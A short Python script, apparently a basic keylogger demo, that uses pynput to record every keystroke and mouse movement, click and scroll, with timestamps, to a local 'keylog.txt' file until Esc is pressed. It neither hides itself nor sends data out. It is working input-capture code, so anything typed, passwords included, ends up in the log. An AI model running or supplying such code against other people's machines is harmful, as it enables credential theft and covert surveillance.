from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
import logging

#Logging parameters
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

#keyboard logging
def on_press(key):
    logging.info(f"Keyboard key pressed: {key}")

def on_release(key):
    if key == Key.esc:
        return False
    
#mouse logging
def on_move(x, y):
    logging.info(f"Mouse moved to ({x}, {y})")

def on_click(x, y, button, pressed):
    action = 'Pressed' if pressed else 'Released'
    logging.info(f"Mouse {action} at ({x}, {y}) with {button}")

def on_scroll(x, y, dx, dy):
    logging.info(f"Mouse scrolled at ({x}, {y})({dx}, {dy})")

keyboard_listener = Listener(on_press=on_press, on_release=on_release)

mouse_listener = MouseListener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
